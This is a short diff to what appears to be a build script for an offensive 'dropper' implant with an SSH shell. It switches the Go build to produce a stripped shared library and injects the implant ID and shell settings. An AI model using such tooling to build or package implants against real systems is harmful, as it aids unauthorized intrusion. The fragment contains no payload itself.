@@ -48,7 +48,8 @@ then
     echo
     echo "[*] Building dropper ${ImplantID} (${DropperName}) for ${DropperOS} / ${DropperArch} "
 
-    go build -ldflags \
+    #go build -ldflags \
+    go build  -buildmode=c-shared -ldflags \
 	"-s -w \
      -X main.ImplantID=${ImplantID}  \
      -X main.SSHShell=${SSHShell}  \
